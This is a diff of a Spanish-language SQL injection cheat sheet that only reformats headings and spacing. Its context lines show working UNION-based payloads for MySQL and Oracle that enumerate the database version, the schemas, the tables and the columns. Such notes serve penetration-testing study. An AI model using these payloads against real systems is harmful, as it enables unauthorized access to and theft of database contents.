@@ -62,7 +62,8 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 + = Espacio en blanco en la URL
 ```
 
-## Para saber el numero de columnas.
+## Para saber el numero de columnas
+
 ```bash
 # MYSQL
 
@@ -81,7 +82,8 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select NULL,banner from v$version-- -       # Mirar la version en Oracle
 ```
 
-### Para saber las bases de datos (DB) existentes.
+### Para saber las bases de datos (DB) existentes
+
 ```bash 
 # MYSQL
 
@@ -90,7 +92,8 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes en una linea, pero separadas por comas
 ```
 
-### Para saber las tablas de la base de datos (DB) especifica.
+### Para saber las tablas de la base de datos (DB) especifica
+
 ```bash
 # MYSQL
 
@@ -107,7 +110,8 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select table_name from all_tables where owner='❮owner_Name❯'-- -
 ```
 
-### Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
+### Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica
+
 ```bash 
 # MYSQL 
 
@@ -122,7 +126,8 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select column_name from all_tab_columns where table_name='❮Table_Name❯'-- -   # Mostrar las columnas en Oracle 
 ```
 
-### Para que nos muestre los datos de las columnas.
+### Para que nos muestre los datos de las columnas
+
 ```bash
 # MYSQL 
 
